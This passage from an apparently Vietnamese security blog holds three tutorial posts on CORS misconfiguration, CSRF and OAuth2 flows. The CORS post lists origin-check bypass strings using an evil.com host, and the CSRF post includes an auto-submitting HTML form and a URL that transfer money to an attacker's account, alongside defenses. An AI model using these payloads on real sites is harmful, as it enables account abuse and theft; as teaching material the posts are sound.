+<h2 id="Cac-lo-hong-phat-sinh-tu-cac-van-de-cau-hinh-CORS"><a href="#Cac-lo-hong-phat-sinh-tu-cac-van-de-cau-hinh-CORS" class="headerlink" title="Các lỗ hổng phát sinh từ các vấn đề cấu hình CORS"></a>Các lỗ hổng phát sinh từ các vấn đề cấu hình CORS</h2><h4 id="1-Serve-tao-Access-Control-Allow-Origin-tu-Origin-header-cua-client-chi-dinh-vi-du"><a href="#1-Serve-tao-Access-Control-Allow-Origin-tu-Origin-header-cua-client-chi-dinh-vi-du" class="headerlink" title="1. Serve tạo Access-Control-Allow-Origin từ  Origin header của client chỉ định,ví dụ :"></a>1. Serve tạo <strong>Access-Control-Allow-Origin</strong> từ  Origin header của client chỉ định,ví dụ :</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;sensitive-victim-data HTTP&#x2F;1.1</span><br><span class="line">Host: hydrasky.ml</span><br><span class="line">Origin: https:&#x2F;&#x2F;malicious-website.com</span><br><span class="line">Cookie: sessionid&#x3D;...</span><br></pre></td></tr></table></figure>
+
+<p>Phản hồi từ Server:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https:&#x2F;&#x2F;malicious-website.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Điều này tương đương với việc bạn cấu hình phản hồi mặc định “Access-Control-Allow-Origin: * ,nó đều cho phép các quyền “read” cross-origin từ malicious-website.com đến hydrasky.ml.Và bạn để ý một chút nữa đó là việc bạn cấu hình “Access-Control-Allow-Credentials: true”- cho phép gửi cookie đính kèm, thì vấn đề lộ thông tin các nhân, bí mật sẽ còn lớn hơn nếu phía malicious-website.com thực hiện các request cần xác thực người dùng.</p>
+<h4 id="2-Loi-phan-tich-Origin-header"><a href="#2-Loi-phan-tich-Origin-header" class="headerlink" title="2. Lỗi phân tích Origin header"></a>2. Lỗi phân tích Origin header</h4><p>   Mặc dù bạn đã cấu hình chỉ cho phép truy cập giữa các domain được chỉ định ,tạo ra môt whitelist các origin nhưng cách áp dụng thì lại có vấn đề. Nó thường xuất phát từ các nhu cầu như là cho phép truy cập từ các subdomain hoặc tên miền phụ , thậm chí còn chưa được đăng kí. Để linh hoạt, đỡ tốn thời gian họ  triển khai bằng cách khớp các tiền tố hoặc hậu tố của Orgin như *<em><em>“*hydrasky.ml”</em>*</em> hoặc sử dụng các biểu thức regular expressions nên dễ bị bypass, ví dụ như :</p>
+<p>Ứng dụng cho phép tất cả các domain cùng hậu tố sau được phép truy cập:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydrasky.ml</span><br></pre></td></tr></table></figure>
+<p>Attacker có thể sử dụng các cách như sau :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- blog.hydrasky.ml</span><br><span class="line">- hackerhydrasky.ml</span><br></pre></td></tr></table></figure>
+<p>Ngoài ra thì có thể sử dụng các kí tự đặc biệt </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">,&amp;&#39;&quot;;!$^*()+&#x3D;&#96;~-_&#x3D;|&#123;&#125;%</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; non printable chars</span><br><span class="line">%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f</span><br></pre></td></tr></table></figure>
+<p>Nhưng một lưu ý là nó còn phụ thuộc vào loại trình duyệt. Tham khảo thêm ở <a target="_blank" rel="noopener" href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">đây</a>   </p>
+<pre><code>- .hydrasky.ml!.evil.com 
+- .hydrasky.ml&quot;.evil.com 
+- .hydrasky.ml$.evil.com 
+- .hydrasky.ml%0b.evil.com 
+- .hydrasky.ml%60.evil.com</code></pre>
+<h4 id="3-Whitelist-Origin-chap-nhan-value-la-NULL"><a href="#3-Whitelist-Origin-chap-nhan-value-la-NULL" class="headerlink" title="3. Whitelist Origin chấp nhận value là NULL"></a>3. Whitelist Origin chấp nhận value là NULL</h4><p>Trong một số trường hợp, Browser sẽ gửi giá trị NULL cho Origin header. Kẻ tân công sẽ sử dụng các kĩ thuật như tạo các cross-origin request bằng iframe để tạo ra giá trị NULL cho Origin header. Phần này thì mình chưa hiểu rõ cách tấn công lắm nhưng các bạn có thể tham khảo ở trên <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">Portswigger</a>.<br>Và còn một số vấn đề nữa nếu đứng từ local do lỗi cấu hình, các bạn tham khảo thêm ở trên mình sẽ không trình bày vì mục tiêu của mình không cần đến. Ngoài ra trên PortSwigger còn có rất nhiều bài lab để các bạn thực hành tấn công.</p>
+<h2 id="Mot-so-anh-huong-tu-cau-hinh-CORS-loi"><a href="#Mot-so-anh-huong-tu-cau-hinh-CORS-loi" class="headerlink" title="Một số ảnh hưởng từ cấu hình CORS lỗi"></a>Một số ảnh hưởng từ cấu hình CORS lỗi</h2><ul>
+<li>Đầu tiên phải kể đến đó là rò rỉ thông tin người dùng.</li>
+<li>Kẻ tấn công có thể lợi dụng lỗ hổng XSS trên các Origin được tin tưởng ,  chỉ định (CORS) để leo thang lỗ hổng. (Nhiều tiên hơn kk)</li>
+<li>Tăng khả năng bị tấn công CSRF.<img src="/images/CORS/CORS3.png" class="[class names]" title="[500] [500] " alt="title text">
+
+
+</li>
+</ul>
+<p>Ok xin chào và hẹn gặp lại các bạn ở bài viết sau. Phần trình bày của mình đến đây là hết chúc các bạn có thể kiếm thật nhiều bounty nhưng hãy nhớ kiến thức mới là gía trị nhất.</p>
+<h2 id="Link-tham-khao"><a href="#Link-tham-khao" class="headerlink" title="Link tham khảo"></a>Link tham khảo</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@jeanpan/what-is-cors-cross-origin-resource-sharing-9f0c463621c6">https://medium.com/@jeanpan/what-is-cors-cross-origin-resource-sharing-9f0c463621c6</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/07/23/CORS/" data-id="ckhqle8tb0001o7jm3mj5582e" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CROSS SIDE REQUEST FORGERY" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/" class="article-date">
+  <time datetime="2020-06-15T04:00:00.000Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4>CSRF là gì ?</h4>
+
+
+
+<p>Cross site request forgery viết tắt là CSRF là một trong những lỗ hổng khá phổ biến của web application, lọt vào top 10 lỗ hổng của OWASP. Cũng được biết đến với các tên gọi <em>one-click attack, session riding, XSRF</em>,(còn mk thích gọi là client site request forgery :) ) , là một phương thức tấn công lừa trình duyệt người dùng thực hiện những request không mong muốn đến server trong khi họ vẫn trong phiên đăng nhập để attacker bypass xác thực.</p>
+<!-- wp:image {"width":591,"height":444} -->
+<p><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/Cross-Site-Request-Forgery.jpg?raw=true" alt="Cách tấn công CSRF"></p>
+<h4>Yếu tố dẫn đến lỗ hổng</h4>
+
+
+
+<p>Chúng ta đều biết server cho phép lưu trữ cookie ở phía người dùng để phân biệt người dùng. Mỗi khi người dùng gửi một request tới một domain nào đó, cookie sẽ được tự động gửi kèm theo. Những web app chỉ sử dụng xác thực thông qua cookie , session cookie sẽ có nguy cơ bị tấn công CSRF. Tác động của nó đến người dùng có thể như thay đổi thông tin như usame, mail, password … hay các hoạt động như là chuyển tiền , xóa tài khoản … . Cùng xem ví dụ dưới đây :</p>
+<p><img src="https://manhnv.com/images/posts/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/CSRF-copy.jpg?raw=true"></p>
+<p> Một website có chức năng tiền và xác thực thông qua “Auth Cookie “ của người dùng và tất nhiên giá trị attacker sẽ không thể biết hay đoán được này. Attacker sẽ tạo ra một GET request đến website vs URL có nội dung là chuyển tiền đến 1 tài khoản của hacker như sau :</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bank.com&#x2F;app&#x2F;transfer?amount&#x3D;100000&amp;destinationAccount&#x3D;7895457898054</span><br><span class="line">GET Request</span><br></pre></td></tr></table></figure>
+
+
+<p>Hoặc nếu server chỉ nhận POST request thì attacker sẽ tạo ra một form trong file html như sau:</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;bank.com&#x2F;app&#x2F;transfer&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;destinationAcount&quot; value&#x3D;&quot;7895457898054&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidedn&quot; name&#x3D;&quot;amount&quot; value&#x3D;&quot;100000&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.forms[0].submit();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;POST request</span><br></pre></td></tr></table></figure>
+
+
+<p>Khi trình duyệt của người dùng thực thi link hay file này sẽ đính kèm giá trị “Auth cookie” của website cấp cho người dùng đã được lưu để duy trì đăng nhập vào request lên server . Hiển nhiên phía server sẽ xác định đây là request do người dùng thực hiện và chuyển tiền tới tài khoản của attacker.</p>
+<h4>Cách thức tấn công </h4>
+
+
+
+<p>Đối với các request mà server chỉ nhận phương thức POST ,attacker sẽ tạo form trong file html và gửi cho nạn nhân hoặc bạn sẽ phải tạo một trang web fishing để lừa nạn nhân truy cập vào và thực hiện request.</p>
+<p>Còn đối với request mà server dùng phương thức GET , attacker cũng có thể dùng form như phương thức POST nhưng thường cách dễ dàng hơn là gửi 1 URL có chứa các tham sỗ đã set sẵn. Hacker sẽ bỏ URL này vào 1 thẻ img, hoặc sử dụng các trang web phising để lừa người dùng thực thi.</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;jav.bank?from&#x3D;Person1&amp;to&#x3D;Person2&amp;amount&#x3D;1000</span><br><span class="line">Ví dụ URL</span><br></pre></td></tr></table></figure>
+
+
+<p>Ngoài ra còn một số cách khai thác đặc biệt đối với các kiểu dữ liệu được gửi đi ví dụ với JSON data. Các bạn có thể tham khảo ở đây :</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b">https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2">https://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0">https://medium.com/@pig.wig45/json-csrf-attack-on-a-social-networking-site-hackerone-platform-3d7aed3239b0</a></li>
+</ul>
+<p>Một số trường hợp có thể đoán được giá trị xác thực như việc sử dụng referer-header để xác thực hoặc server cùng tồn tại lỗ hổng CRLF cũng có thể dẫn đến tấn công cookie injection và chuyển sang tấn công CSRF. </p>
+<p>Cuối cùng là việc sử dụng xác thực lỏng lẻo như csrf_token không liên kết với users session hoặc bỏ qua xác thực nếu không nhận được csrf_token đều có thể dẫn đến bypass.</p>
+<p>Tất cả các trường hợp đều được giải thích rõ  và thực hành trong các lab của PortSwigger, các bạn có thể tham khảo link cuối bài.</p>
+<h4>Làm thế nào để ngăn chặn tấn công CSRF?</h4>
+
+
+
+<p>Người dùng không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn. Không truy cập vào các trang web độc hại dễ bị lừa. Không thực thi các file không rõ nguồn gốc và chức năng. </p>
+<p>Còn về phía server sử dụng captcha, các thông báo xác nhận. Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là con người hay không? Các thao tác quan trọng như “đăng nhập” hay là “chuyển khoản” ,”thanh toán” thường là hay sử dụng captcha. Tuy nhiên, việc sử dụng captcha có thể gây khó khăn cho một vài đối tượng người dùng và làm họ khó chịu. Các thông báo xác nhận cũng thường được sử dụng, ví dụ như việc hiển thị một thông báo xác nhận “bạn có muốn xóa hay k” cũng làm hạn chế các kĩ thuật Cả hai cách trên vẫn có thể bị vượt qua nếu kẻ tấn công có một kịch bản hoàn hảo và kết hợp với lỗi XSS.</p>
+<p>Và thứ 2 là sử dụng token (csrf_token,jwt …): Tạo ra một token tương ứng với mỗi form, token này sẽ là duy nhất đối với mỗi form và thường thì hàm tạo ra token này sẽ nhận đối số là”SESSION”. Khi request đến, hệ thống sẽ thực hiên so khớp giá trị token này để quyết định có thực hiện hay không.</p>
+<p>Link tham khảo :</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://gbhackers.com/a8-cross-site-request-forgery-csrf/">https://gbhackers.com/a8-cross-site-request-forgery-csrf/</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.hydrasky.ml/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/" data-id="ckhqle8tf0003o7jm158ldf2q" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Oauth" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/14/Oauth/" class="article-date">
+  <time datetime="2020-06-14T22:20:34.000Z" itemprop="datePublished">2020-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/14/Oauth/">OAUTH</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <img src="/images/OAUTH/oauth2.jpg" class="[class names]" title="[500] [500] " alt="Oauth2">
+
+<p>Xin chào các bạn mình đã quay trở lại với … bài viết dài , thôi vào nội dung luôn .</p>
+<h2>Khái niệm</h2>
+
+
+
+<p> <strong>OAuth</strong>  (Open Authorization) là một phương thức ủy quyền để cung cấp khả năng truy cập các tài nguyên qua giao thức HTTP . OAuth cho phép các trang web hoặc ứng dụng (Customer) truy cập tài nguyên được bảo vệ từ dịch vụ web (Service Provider) thông qua API mà không yêu cầu người dùng tiết lộ thông tin đăng nhập được cấp bởi nhà cung cấp dịch vụ cho bên thứ ba. Nó hoạt động như một trung gian thay mặt cho người dùng cuối, cấp quyền sử dụng thông tin của tài khoản được chia sẻ cho dịch vụ của bên thứ ba với access token.</p>
+<h2>Lịch sử</h2>
+
+
+
+<p>OAuth được phát hành lần đầu tiên vào năm 2007 là phương thức ủy quyền sử dụng cho Twitter application program interface (API) với tên gọi là OpenID . Năm 2010, OAuth 1.0 Revision được xuất bản đê giải quyết về vấn đề session fixation tồn tại. Năm 2012, Nhóm làm việc OAuth của IETF đã xuất bản bản thảo đầu tiên của giao thức OAuth 2.0. Giống như OAuth ban đầu, OAuth 2.0 cung cấp cho người dùng khả năng cấp quyền truy cập ứng dụng của bên thứ ba vào tài nguyên web mà không cần chia sẻ mật khẩu. Tuy nhiên, đây là một giao thức hoàn toàn mới và không tương thích ngược với OAuth 1.0. Các tính năng được cập nhật bao gồm uồng cấp mã ủy quyền mới để áp dụng cho các ứng dụng di động, chữ ký được đơn giản hóa và token tồn tại trong thời gian ngắn với các ủy quyền tồn tại lâu dài. Và hiện tại OAuth đãng triển khai , phát triển phiên bản OAuth 2.1.</p>
+<p>Trong bài viết này mình sẽ chỉ trình bày các thứ liên quan đến phiên bản OAuth2 bởi một phần OAuth 2 đã được sử dụng phổ biến hơn và  nếu mk trình bày cả OAuth1 nữa rất là dài. cực kì nhiều thứ nên các bạn có thể tham khảo bên ngoài hoặc đợi một ngày nào đó mình sẽ viết về nó.</p>
+<h2>Các thuật ngữ sử dụng</h2>
+
+
+
+<p> <strong>Resource owner</strong>  (User) Một thực thể có khả năng cấp quyền truy cập vào một tài nguyên được bảo vệ. Khi chủ sở hữu tài nguyên là một người , nó được gọi là một người dùng cuối.</p>
+<p> <strong>Client</strong>  (Application) Một ứng dụng thực hiện các yêu cầu đến tài nguyên được bảo vệ thay mặt cho chủ sở hữu tài nguyên và với sự ủy quyền của nó . Hiểu một cách đơn giản hơn là những ứng dụng mong muốn truy cập vào dữ liệu người dùng.</p>
+<p> <strong>Authorization server</strong>  (API) Máy chủ cấp phát access token cho client sau khi xác thực thành công với chủ sở hữu tài nguyên và có được ủy quyền.</p>
+<p> <strong>Resource Server</strong>  (API) Máy chủ lưu trữ các tài nguyên được bảo vệ, có quyền chấp nhận và phản hồi các requests có chứa access token đến tài nguyên được bảo vệ, hay chính là xác thực ủy quyền</p>
+<p>Resource Server và Authorization Server là một điểm khác biệt giữa OAuth2 và OAuth1 khi tách biệt hai thao tác: cấp mã ủy quyền (access token) và xác thực ủy quyền (Authentication) thành 2 Server còn OAuth1 thực hiện trên cùng một server gọi là  <strong>Sevice Provider</strong> .</p>
+<h2>OAuth hoạt động như thế nào?</h2>
+
+
+<!-- wp:image {"id":345,"sizeSlug":"large"} -->
+<img src="/images/OAUTH/oauth3.png" class="[class names]" title="[500] [500] " alt="Oauth2">
+
+
+<!-- wp:list {"ordered":true} -->
+<ol><li>Client sẽ yêu cầu ủy quyền truy cập các Protected Resource từ Resource owner (User). Cient có thể trực tiếp thực hiện yêu cầu ủy quyền tới Resource owner hoặc thông qua Authorization server enpoint để User cho phép truy cập.</li><li>User sẽ xác thực và ủy quyền truy cập tới Resource cho client , lúc này Ứng dụng sẽ nhận được Cấp phép (Authorization Grant) . Sẽ có 4 kiểu cấp quyền nên việc cấp như thế nào client sẽ phụ thuộc vào loại ứng dụng dùng để truy cập vào tài nguyên. Đây được coi như là chứng chỉ đại diện cho sự ủy quyền của Resource Owner.</li><li>Ứng dụng client yêu cầu access token từ Authorization Server bằng cách chuyển Authorization Grant cùng với các thông tin khác để xác thực, chẳng hạn như  **client ID** ,  **client secret** , and  **grant_type** .</li><li>Khi xác thực thành công, Authorization Server sẽ phát hành  **Access Token**  và  **Refresh Token**  cho ứng dụng client.</li><li>Ứng dụng yêu cầu quyền truy cập vào Protected Resource từ Resource Server và xác thực bằng cách đưa ra Access Token .</li><li>Khi xác thực thành công yêu cầu của máy khách, Resource Server sẽ trả về tài nguyên được yêu cầu.</li></ol>
+
+
+<p>Mục đích  <strong>Refresh token</strong>  ở đây là dùng để xác thực với Authorization Server thay vì nhờ User như trên để lấy Access token mới khi Access token cũ đã bị hết hạn. Lưu ý là không phải   <strong>Grant Types</strong>  nào cũng hỗ trợ refresh_token và việc có nhận, sử dụng nó là không bắt buộc, là tùy chọn của bạn.</p>
+<p>grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA</p>
+<h2> **Authorization grant types** </h2>
+
+
+
+<p>OAuth 2.0 Authorization Framework đã đưa ra 4 luồng để lấy Access Token, các luồng này được gọi là “ <strong>Grant types</strong> “ .</p>
+<h3>Authorization Code Flow</h3>
+
+
+
+<p>Đây là một hình thức ủy quyền được dùng phổ biến nhất hiện nay, thường được sử dụng bởi các ứng dụng web triển khai trên máy chủ và nó có thể cung cấp cả Access Token và Refresh Token. Authentization Code thuộc kiểu  <strong>redirection-based flow</strong>  nên Client có thể tương tác với resource owner và có khả năng nhận các yêu cầu đến từ Authorization Server .</p>
+<h4>Flow</h4>
+
+
+
+<figure class="wp-block-image"><img src="https://i2.wp.com/blogs.innovationm.com/wp-content/uploads/2019/07/blog-open1.png?resize=625%2C348" alt="Oauth2 authorization code flow "/></figure>
+
+
+
+<p>Đầu tiên, chọn đăng nhập thông qua một bên thứ 3 nào đấy , ví dụ trong hình “Login in with Google”</p>
+<p>Ứng dụng (Client)  sẽ chuyển hướng người dùng đến Authorization Server (/authorize endpoint) .</p>
+<p>https:&#47;&#47;accounts.google.com/oauth/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=yelp.com/callback&amp;scope=profile_contact<br>Trong đó : </p>
+<ul>
+<li>response_type là tham số  chỉ định ứng dụng đang yêu cầu nhận authorization_code </li>
+<li>client_id là ID của ứng dụng đăng kí với service bên thứ 3 đó, Authorization Server sẽ biết khách hàng của ứng dụng nào đang yêu cầu xin ủy quyền.</li>
+<li>redirect_uri là nơi sẽ truyển hướng về khi nhận code</li>
+<li>scope : là phạm vi quyền truy cập</li>
+</ul>
+<p>Authorization Server sẽ chuyến hướng User đến mục đăng nhập nếu như bạn chưa đăng nhập và lời nhắc có cho chép ủy quyền hay không? </p>
+<p>Sau khi User cho phép , Authorization Server sẽ tiếp tục chuyến hướng người dùng quay trở lại ứng dụng  (Client) với Authorization  <strong>CODE</strong>  .( Các bước sau không còn cần tác nhân User)</p>
+<p>https:&#47;&#47;yelp.com/callback?code=AUTHORIZATION_CODE</p>
+<p>Sau khi nhận được, Client sẽ thực hiện một request POST gửi Authorization  <strong>CODE</strong>  đó đến Authorization Server (/oauth/token endpoint) cùng với lại các tham số CLIENT ID và CLIENT SECRET của ứng dụng để Server xác thực . </p>
+<p>https:&#47;&#47;accounts.goole.com/oauth/token?client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;grant_type=authorization_code&amp;code=AUTHORIZATION_CODE&amp;redirect_uri=CALLBACK_URL<br>Trong đó :<br>CLIENT SECRET ở đây là một giá trị bí mật chỉ cho phép APP và Authorization Server biết.</p>
+<p>Phía Authorization Server sẽ thực hiện xác thức các giá trị được gửi.</p>
+<p>Nếu như thành công , Authorization Server trả về ID Token và Access Token ( Refresh Token).</p>
+<p>Bây giờ ứng dụng  có thể sử dụng Access Token để truy cập thông tin  của người dùng User thông qua API.</p>
+<p>Grant Type này còn thường được dùng cho mobile apps nhưng có đôi chút khác biệt trong quá trình xin ủy quyền. Nguyên nhân là do native apps hay Single-page apps  không thể lưu trữ hay đảm bảo được tính bí mật cho  <strong>CLIENT SECRET</strong>   nên không thể sử dụng cái giá trị này để Authorization Server xác thực định danh ứng dụng. Và đó là lí do Flow sẽ bị thay đổi với cái tên là Authorization Code Flow với  <strong>Proof Key for Code Exchange (PKCE)</strong> . Lúc này thay vì sử dụng CLIENT SECRET  nó sẽ sử dụng  <strong>CODE VERIF</strong> IER và  <strong>Challenge</strong> . Chi tiết hơn bạn có thể tham khảo <a href="https://auth0.com/docs/flows/concepts/auth-code-pkce" target="_blank" rel="noreferrer noopener">tại đây</a> .</p>
+<p><strong>Implicit Flow</strong></p>
+<p>Loại ủy quyền này thường được sử dụng cho các ứng dụng chạy trên trình duyệt (VD: Chrome Extension) và có thể ấp dụng cho các ứng dụng mà không sử dụng Client Secret nhưng người ta vẫn khuyến cáo bạn nên dùng  ** <strong>PKCE</strong> **  hơn bởi Implicit không quá bảo mật .</p>
+<p>Khác với lại Authorization code , Authorization Server sẽ trả về Access Token luôn thay vì tiến hành trao đổi như Authorization code ,thứ 2 Implicit là  chỉ dùng để lấy access token và không hỗ trợ  Refresh Token.</p>
+<p><strong>FLow</strong></p>
+<img src="/images/OAUTH/auth-sequence-implicit-form-post.png" class="[class names]" title="[500] [500] " alt="Implicit Flow">
+
+
+
+<p>Đầu tiên  User sẽ chọn login với App thông qua bên thứ 3 </p>
+<p>Trình duyệt/APP lúc này sẽ chuyển hướng người dùng đến Authorizarion Server (/authorize endpoint) cùng với các tham số như response_type=id_token cho biết loại thông tin xác thực được yêu cầu. Nó cũng chuyển cùng một tham số response_mode của form_post để đảm bảo tính bảo mật.</p>
+<p>/authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=<a target="_blank" rel="noopener" href="https://client.example.com/callback">https://client.example.com/callback</a> </p>
+<p>Phía AS yêu cầu USER xác thực bằng form đăng nhập. User tiến hành xác thực  và ủy quyền cho ứng dụng .</p>
+<p>Authorization Server chuyển hướng người dùng quay trở lại APP cùng với ID Token (Tương tự accsess token).</p>
+<p>http:&#47;&#47;example.com/callback#access_token=2YotnFZFEjr1zCsicMWpAA&amp;state=xyz&amp;token_type=example&amp;expires_in=3600</p>
+<p>Ok như vậy nếu như ứng dụng là 1 web-based app thì đến đây là có thể call API với Access Token để lấy dữ liệu từ Resource Owner. Còn đối với Mobile Application sẽ cần phải có các bước khác để trích xuất Access Token trong URI bằng script và gửi về cho nó. Nhưng một phần vì mình chưa có cơ hội được thực nghiệm nên mình sẽ không trình bày về nó , và dù tài liệu có nói nhưng rất khó mường tượng ra. Bạn có thể tham khảo ở <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc6749#section-4.2" target="_blank">đây</a>.</p>
+<h2>Resource owner credentials grant</h2>
+
+
+
+<p>Grant type này chỉ áp dụng cho  cho những ứng dụng có mức độ tin tưởng cao ( ví dụ như các ứng dụng của các dịch vụ đó phát hành hoặc các ứng dụng mặc định trên hệ thống )  . Bởi vì User sẽ phải cung cấp thông tin username và password trực tiếp cho Application sử dụng để lấy access_token.</p>
+<h4>Flow</h4>
+
+
+
+<figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/api-auth/password-grant.png" alt="Tài nguyên mật khẩu của chủ sở hữu"/></figure>
+
+
+
+<p>Đầu tiên User nhập thông tin đăng nhập (Username/Password) vào ứng dụng.</p>
+<p>grant_type=password&amp;username=johndoe&amp;password=A3ddj3w</p>
+<p>Ứng dụng chuyển tiếp thông tin đăng nhập đến Authorization Server.</p>
+<p>Authorization Server xác thực thông tin và trả về Access Token và Refresh Token.</p>
+<p>Ứng dụng có thể sử dụng Access Token để gọi API .</p>
+<h2>Client Credentials Flow</h2>
+
+
+
+<p>Với các ứng dụng machine-to-machine (M2M), chẳng hạn như CLI, daemon hoặc dịch vụ chạy trên back-end của bạn, hệ thống sẽ xác thực và ủy quyền cho ứng dụng thay vì người dùng. Ứng dụng có thể yêu cầu lấy Access Token bằng bằng các thông tin của ứng dụng như CLIENT ID , CLIENT SECRET.</p>
+<h4>Flow</h4>
+
+
+
+<figure class="wp-block-image"><img src="https://cdn2.auth0.com/docs/media/articles/flows/concepts/auth-sequence-client-credentials.png" alt="Trình tự xác thực luồng thông tin khách hàng"/></figure>
+
+
+
+<p>Client  xác thực với Authorization Server bằng CLIENT ID và CLIENT SECRET .</p>
+<p>Authorization Server  xác thực và  phản hồi với Access Token.</p>
+<p>Ứng dụng của bạn có thể sử dụng Access Token để gọi API cho chính nó.</p>
+<p>Ok như vậy là mình trình bày khá tổng quát về các thứ của OAuth2, mình khuyến khích các bạn đọc thêm về nó chứ mình không thể nào viết chi tiết hơn được nữa mặc dù không khó hiểu nhưng nó quá dài. Mình sẽ để link bài viết ở cuối để các bạn tham khảo.</p>
